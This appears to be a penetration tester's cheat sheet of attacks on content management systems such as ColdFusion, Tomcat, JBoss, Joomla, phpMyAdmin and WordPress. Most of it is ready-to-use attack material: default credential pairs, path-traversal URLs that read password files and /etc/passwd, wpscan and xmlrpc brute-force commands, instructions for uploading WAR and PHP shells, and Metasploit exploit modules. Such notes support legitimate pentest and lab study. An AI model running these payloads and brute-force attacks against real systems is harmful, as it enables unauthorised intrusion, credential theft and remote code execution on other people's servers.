# CMS Specific Vulnerabilities and Exploits    
### Default Creds 

    https://cirt.net/passwords
    https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
    
### Adobe Coldfusion 
https://nets.ec/Coldfusion_hacking   
https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8

    Metasploit - Determine version
    /CFIDE/adminapi/base.cfc?wsdl
    Version 8 Vulnerabilities
    Fckeditor: use exploit/windows/http/coldfusion_fckeditor

LFI 

    http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

### Elastix 

    default login are admin:admin at /vtigercrm/
    able to upload shell in profile-photo
    Examine configuration files - Generic
    Examine httpd.conf/ windows config files 
    
### Drupal
[droopsescan](https://github.com/droope/droopescan) 

    /CHANGELOG.txt to find version

### JBoss

    JMX Console http://IP:8080/jmxconcole/
    WAR File payload   

### Jenkins
[pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)   

### Joomla 

    admin page: /administrator
    other pages: configuration.php, diagnostics.php, joomla.inc.php, config.inc.php   
    
### PHPMyAdmin

    Default password root:root, pma:
    Brute force with Burp or phpmyadmin python script

### Tomcat 

    Usually port 8080, /manager
    default creds tomcat:s3cret
    generate WAR reverse shell payload, upload and deploy 
    
### Wordpress  
https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet    
https://raphaelrichard-sec.fr/learning-notes/hacking-wordpress     
[Hacking Wordpress Notes](https://github.com/cyberteach360/Hacking-Wordpress)    
.wp-config.php.swp exploit - https://ritcsec.wordpress.com/2020/04/28/how-i-accidentally-discovered-cve-2017-17087-2/         

    admin and login pages:  /wp-admin    /wp-login     /wp-admin/login.php   /login.php    /wp-login.php     
    config files:  /setup-config.php   /wp-config.php    
    curl http://10.10.10.10/wordpress/ | grep 'content="WordPress'  #get WordPress version   
    curl -s -X GET http://10.10.10.10/wordpress | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2    #get plugins     
    curl -s -X GET http://10.10.10.10 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2   #get themes    
    curl http://10.10.10.10/wp-json/wp/v2/users | jq    #user enum   
wpscan 
Register for a free account and get an API token from https://wpscan.com/    

    wpscan --url <domain>
    wpscan --url <domain> --enumerate ap at (All Plugins, All Themes)
    wpscan --url <domain> --enumerate u (Usernames)       #or zoom.py 
    wpscan --url <domain> --enumerate v      
    wpscan --url http://10.10.10.10/wordpress --enumerate --api-token <API_TOKEN>
    wpscan -u 192.168.0.15 --enumerate -t --enumerate u --enumerate p      

Bruteforce login page with wpscan   
Xmlrpc method is usually faster (if enabled)       

    wpscan --url ipaddress --usernames name_list --passwords wordlist    
    wpscan --password-attack xmlrpc -t 20 -U admin, username -P passwords.txt --url http://10.10.10.10           


Xmlrpc.php - if enabled you may be able to use this to brute force creds. Send the below request to check    
If wp.getUserBlogs, wp.getCategories or metaWeblog.getUsersBlogs are available - can brute force    
Ref: https://gist.github.com/georgestephanis/5681982    
```
POST /wordpress/xmlrpc.php HTTP/1.1
Host: 10.10.10.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```   
Vulnerable Mail Masta Plugin Exploit        

    curl http://10.10.10.10/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd     
    /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd    
    
RCE via Theme Editor using Admin Creds    
Login, select Appearance on the side panel and select Theme Editor to modify the PHP source code. Select an inactive theme to avod breaking the main theme.       

    exploit/unix/webapp/wp_admin_shell_upload    #metasploit exploit   
